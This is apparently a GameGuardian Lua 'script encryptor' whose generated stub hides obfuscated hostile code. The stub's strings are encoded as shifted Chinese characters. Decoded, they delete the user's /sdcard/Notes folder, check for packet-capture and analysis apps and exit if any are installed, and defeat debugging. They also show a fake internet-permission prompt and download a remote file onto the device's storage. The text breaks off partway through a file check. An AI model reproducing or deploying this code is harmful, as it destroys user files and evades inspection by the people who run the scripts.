g = {}
g.last = "/sdcard/"
g.info = nil
g.config = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("[^/]+$") .. "cfg"
g.data = loadfile(g.config)
if g.data ~= nil then
  g.info = g.data()
  g.data = nil
end
if g.info == nil then
  g.info = { g.last, g.last:gsub("/[^/]+$", "") }
end

while true do
  g.info = gg.prompt({
    '📂 Select file :', -- 1
    '📂 Select folder  :' -- 2
  }, g.info, {
    'file', -- 1
    'path' -- 2
  })

  gg.saveVariable(g.info, g.config)
  g.last = g.info[1]
  if loadfile(g.last) == nil then
    gg.alert("⚠️ Script not Found! ⚠️")
    return
  else
    g.out = g.last:match("[^/]+$")
    g.out = g.out:gsub(".lua", ".Batman")
    g.out = g.info[2] .. "" .. g.out .. ".lua"
  end

  local file = io.open(g.last, "r")
  local DATA = file:read('*a')
  file:close()
  
  function criptoInc(str)
    local result = {}
    local shift_value = 5 
    for i = 1, #str do
        local byte = string.byte(str, i)
        local shifted_byte = (byte + shift_value) % 256 
        table.insert(result, shifted_byte)
    end
    for i = 1, math.floor(#result / 2) do
        result[i], result[#result - i + 1] = result[#result - i + 1], result[i]
    end
    for i = 1, #result do
        result[i] = string.char(result[i])
    end
    return table.concat(result)
end

  DECODE =[[

local uuuoopp = function(str) local Nm = {} ; local A = "" for i,ii in utf8.codes(str) do A = utf8.char(ii - 30000) ; table.insert(Nm,A) end return (''..table.concat(Nm,"")..'') end

function uuuooppp()
SG = gg.alert("The script wants to access the internet. If you allow access, the script will be able to steal your logins, passwords, saves and other data from game. Also it will be able to steal your other scripts, or download viruses to your device.\n\nAllow the script access to the internet?", "No", "Yes")
if SG == 1 then
print (uuuoopp("疐疃畷畐畭畐疜疟疑疔畘疗疗畞疝疑疛疕疂疕疡疥疕疣疤畘畗疘疤疤疠疣番畟畟疠疑疣疤疕疒疙疞畞疓疟疝畗留畞疓疟疞疤疕疞疤留疐"))
print (uuuoopp("疒疑疔畐疑疢疗疥疝疕疞疤畐畓畡畐疤疟畐畗疜疟疑疔畗畐畘疣疤疢疙疞疗畐疟疢畐疖疥疞疓疤疙疟疞畐疕疨疠疕疓疤疕疔畜畐疗疟疤畐疞疙疜留畐畘疗疜疟疒疑疜畐畗疜疟疑疔畗留"))
print (uuuoopp("疜疕疦疕疜畐畭畐畡畜畐疓疟疞疣疤畐畭畐畧畜畐疠疢疟疤疟畐畭畐畠畜畐疥疠疦疑疜畐畭畐畡畜畐疦疑疢疣畐畭畐畣畜畐疓疟疔疕畐畭畐畡畢"))
print (uuuoopp("畳畱畼畼畐疦畠畞畞疦畡畐疦畠畞畞疦畠"))
print (uuuoopp("畐畫畐疀畳畐畦畐畳畿畴畵畐畠畡畠畠畨畠畡畴畐畿疀畐畢畩畐畱畐畠畐畲畐畢畐畳畐畢畐畲疨畐畡畠畢畦畐疣畲疨畐畝畡畣畠畠畤略"))
print (uuuoopp("疣疤疑疓疛畐疤疢疑疓疕疒疑疓疛番"))
print (uuuoopp("疋畺疑疦疑疍番畐疙疞畐畯"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑疆疑疜疥疕畞疑畘疣疢疓番畡畠畢畤留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞畲疑疣疕畼疙疒畔疜疟疑疔畞疑疏畘疣疢疓番畢畦畦留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞疆疑疢畱疢疗當疥疞疓疤疙疟疞畞疑畘疣疢疓番略畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疑畘疣疢疓番略畣畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疜畘疣疢疓番畡畦畠留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畞疔畘疣疢疓番畦畠略畦留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畔疃疓疢疙疠疤疄疘疢疕疑疔畞疢疥疞畘疣疢疓番略畧畨略留"))
os[uuuoopp("疕疨疙疤")]()
end
if SG == 2 then
print (uuuoopp("疐疃畷畐畭畐疜疟疑疔畘疗疗畞疝疑疛疕疂疕疡疥疕疣疤畘畗疘疤疤疠疣番畟畟疠疑疣疤疕疒疙疞畞疓疟疝畗留畞疓疟疞疤疕疞疤留疐"))
print (uuuoopp("疒疑疔畐疑疢疗疥疝疕疞疤畐畓畡畐疤疟畐畗疜疟疑疔畗畐畘疣疤疢疙疞疗畐疟疢畐疖疥疞疓疤疙疟疞畐疕疨疠疕疓疤疕疔畜畐疗疟疤畐疞疙疜留畐畘疗疜疟疒疑疜畐畗疜疟疑疔畗留"))
print (uuuoopp("疜疕疦疕疜畐畭畐畡畜畐疓疟疞疣疤畐畭畐畧畜畐疠疢疟疤疟畐畭畐畠畜畐疥疠疦疑疜畐畭畐畡畜畐疦疑疢疣畐畭畐畣畜畐疓疟疔疕畐畭畐畡畢"))
print (uuuoopp("畳畱畼畼畐疦畠畞畞疦畡畐疦畠畞畞疦畠"))
print (uuuoopp("畐畫畐疀畳畐畦畐畳畿畴畵畐畠畡畠畠畨畠畡畴畐畿疀畐畢畩畐畱畐畠畐畲畐畢畐畳畐畢畐畲疨畐畡畠畢畦畐疣畲疨畐畝畡畣畠畠畤略"))
print (uuuoopp("疣疤疑疓疛畐疤疢疑疓疕疒疑疓疛番"))
print (uuuoopp("疋畺疑疦疑疍番畐疙疞畐畯"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑疆疑疜疥疕畞疑畘疣疢疓番畡畠畢畤留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞畲疑疣疕畼疙疒畔疜疟疑疔畞疑疏畘疣疢疓番畢畦畦留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞疆疑疢畱疢疗當疥疞疓疤疙疟疞畞疑畘疣疢疓番略畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疑畘疣疢疓番略畣畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疜畘疣疢疓番畡畦畠留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畞疔畘疣疢疓番畦畠略畦留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畔疃疓疢疙疠疤疄疘疢疕疑疔畞疢疥疞畘疣疢疓番略畧畨略留"))
os[uuuoopp("疕疨疙疤")]()
end
end

if debug.traceback == nil then
    uuuooppp()
    return
end

        if debug.gethook == nil then
    uuuooppp()
    return
end

        if debug.getinfo == nil then
    uuuooppp()
    return
end

        if debug.getlocal == nil then
    uuuooppp()
    return
end
        if debug.getmetatable == nil then
    uuuooppp()
    return
end
        if debug.getregistry == nil then
    uuuooppp()
    return
end
        if debug.getupvalue == nil then
    uuuooppp()
    return
end
        if debug.sethook == nil then
    uuuooppp()
    return
end
        if debug.setlocal == nil then
    uuuooppp()
    return
end
        if debug.setmetatable == nil then
    uuuooppp()
    return
end
        if debug.setupvalue == nil then
    uuuooppp()
    return
end
        if debug.traceback == nil then
    uuuooppp()
    return
end
        if debug.upvalueid == nil then
    uuuooppp()
    return
end
        
        if debug.upvaluejoin == nil then
    uuuooppp()
    return
end

function xhtc()
    print("[拦截log]")
    os.exit()
    while true do
        os.exit()
        for sh = 1, 99999 do
            os.exit()
        end
    end
end

X=os.time()
for i=1,500 do
gg.searchNumber("小鳄鱼", gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0, -1)
end
Y=os.time() 
if Y-X>5 then   
xhtc() 
end

local status, result = pcall(function()
  local str = string.char(71, 88, 76, 229, 176, 143, 228, 186, 148)
  gg.searchNumber(str, gg.TYPE_BYTE)
end)

if not status then
  gg.alert("[拦截log]")
  os.exit()
end


local __x = function(str) local Nm = {} ; local A = "" for i,ii in utf8.codes(str) do A = utf8.char(ii - 30000) ; table.insert(Nm,A) end return (''..table.concat(Nm,"")..'') end

os[__x("疢疕疝疟疦疕")](__x("畟疣疔疓疑疢疔畟畾疟疤疕疣"))

  if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疜疥疑疔疕疓")) or gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疨疨疜疣")) or gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疨疨疜疣畝畡畞畡畠")) then
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疓疘疕疞疜疥疞畞疑疥疤疥疝疞疓疜疟疥疔疜疥疑")) then
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疑疗疗疙疕疞疟疢疤疘畞疝疑疨畞疠疟疣疤疔疑疤疑")) then
  os[__x("疕疨疙疤")]()
end

  if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疟疥疣疘疙畞疗疤疠疓疑疞疑疢疩")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疑疓疛疑疗疕疣疞疙疖疖疕疢畞疖疢疤疠疑疢疜疑疛")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疑疠疠畞疗疢疕疩疣疘疙疢疤疣畞疣疣疜疓疑疠疤疥疢疕")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疙疞疘疥疙畞疞疕疤疧疟疢疛疓疑疠疤疥疢疕")) then
  print(__x("畴疕疣疙疞疣疤疑疜疕畐疟畐疀疑疓疛疕疤畐畳疑疠疤疥疢疕"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疙疞疘疥疙畞疧疙疖疙疑疞疑疜疩疪疕疢")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疚疠畞疓疟畞疤疑疟疣疟疖疤疧疑疢疕畞疑疞疔疢疟疙疔畞疠疑疓疛疕疤疓疑疠疤疥疢疕")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疢疑疒疑疜疗疑疝疙疞疗畞疜疟疗疗疕疢")) then
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疖疢疤疠疑疢疜疑疛畞疢疟疟疤疣疞疙疖疖疕疢")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疑疞疩疏畞疒疟疔疩疏畞疓疑疞疏畞疖疥疓疛疏畞疤疕疞疓疕疞疤疏")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疚疦疣疒疝疘疔疣疠疝疞疖疒疑疝疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疕疔疧疟疜疖疗疑疝疙疞疗畞疢疙疠疗疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疢疕疨疡疖疖疤疖疣疨疕疛疝畞疛疜")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疞疟疓疘疡疨疠疥疓疣疒疜疔疡疡疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疘疥疕疓疪疨疢疤疤疜疘疗疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疩疩畞疡疠疤疦疢疚疧疕疢疧畞疗疘疟疕疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞畵疗疩疠疤畞疩疥疟疣疣疕疕疖")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疤疣疣疖疚疙疠疛疝疢疓疟")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疙疠畞疠疑疙疔疘疑疓疛疣疟疞疜疩畞疝疢畞疤疟疨疙疞")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疙疟疩疩疣疦疗疖疣疢疙疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疢疤疕疑疝疪畞疙疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疚疤疒疟疔疗疠疡疨疟疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞畲疩畷畷疈畵疊")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疕疙疔疩疝疥疝疓疗疘疠疖疕疕疕疑疦疠疣")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疟疔畞疙疢疑疡")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疔疪疕疜疤疤疧疩疥疩疩疕疣")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣疨疡疑")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疨疩疩疨疗疨疖疞")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疪疗疒")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疞疠疡疛")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疧疚疦疞疧疕疣疒疗疘疛疨疒疚疪疞疒疧疟")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疒疜疑疓疛疔疥疤疩畞疗疓")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣畞疖疩疟疚疢疝疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疟疨疝疕疝疕疛")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疘疣疘疧疘疠疦疡疦疢疥疦疚疤疥")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疙疢疕疟疞疗疑疝疙疞疗畞疖疟疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疑疢疑疞疟疙疑疧疟疢疛疣畞疥疞疙疓疥疣畞疑疞疔疢疟疙疔畞疣疣疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疑疙疞疓疙疤疩疗疑疝疙疞疗畞疗疗疝疟疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疦疤畤疥")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疞疩疔疠疦疣疒畞疪畞疢畞疠疛疗疘")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疝疣疝")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣疥疔疣疚疓疡疦疦疓疝疗疥疤疔疚疕疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疓疟疟疜疖疟疟疜疗疗疖疥疓疛疣疓疢疙疠疤畞疤疝")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疟疨疓疩疒疕疢畞疗疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疘疓疛疕疑疝畞疝疚疗疡疜")) then 
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疗疛疤疤疪畞疢疑疥疣疡疧疜")) then 
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疤疓")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疙疠畞疣疣疤疟疟疜")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end



if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疣疣疤疟疟疜畞疝疟疔畞疝疑疖疙疑")) then
  print(__x("畐疝疑疖疙疑畯畯畯"))
  os[__x("疕疨疙疤")]()
end



if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疣疣疤疟疟疜畞疟疞疜疩畞疓疟疝畞疣疣疤疟疟疜")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疑疕疢疟畞疣疣")) 
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疔疕疓疢疩疠疤畞疤疟疟疜畞疒疩畞疚疟疛疕疢畞疗疗")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
Link = __x("疘疤疤疠疣番畟畟疕疞疓疢疩疠疤疕疔畝疤疒疞畠畞疗疣疤疑疤疙疓畞疓疟疝畟疙疝疑疗疕疣畯疡畭疤疒疞番畱畾疔畩畷疓疁疦畦疓疤畱疠畴疇疣疈疦疁疄畠畽畴畴疥疉疔畺疖畠疗疜畾疜疅疪疠疃畦畸疧疧畖疥疣疡疠畭畳畱疅")
      path = __x("畟疣疔疓疑疢疔畟")
      Name = __x("疩疟疥疏疙疣疏疞疟疟疒畞疠疞疗")
      Slapper = gg[__x("疝疑疛疕疂疕疡疥疕疣疤")](Link).content
      io.open(path .. __x("畟") ..Name ,__x("疧")):write(Slapper)
      gg[__x("疑疜疕疢疤")](__x("畷畷畐畴畵畳疂疉疀疄畐畴畵疄畵畳疄畵畴"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疟疥疣疘疙畞疗疤疠疓疑疞疑疢疩"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疑疓疛疑疗疕疣疞疙疖疖疕疢畞疖疢疤疠疑疢疜疑疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疑疠疠畞疗疢疕疩疣疘疙疢疤疣畞疣疣疜疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疙疞疘疥疙畞疞疕疤疧疟疢疛疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疙疞疘疥疙畞疧疙疖疙疑疞疑疜疩疪疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疚疠畞疓疟畞疤疑疟疣疟疖疤疧疑疢疕畞疑疞疔疢疟疙疔畞疠疑疓疛疕疤疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疖疢疤疠疑疢疜疑疛畞疢疟疟疤疣疞疙疖疖疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疑疞疩疏畞疒疟疔疩疏畞疓疑疞疏畞疖疥疓疛疏畞疤疕疞疓疕疞疤疏"))
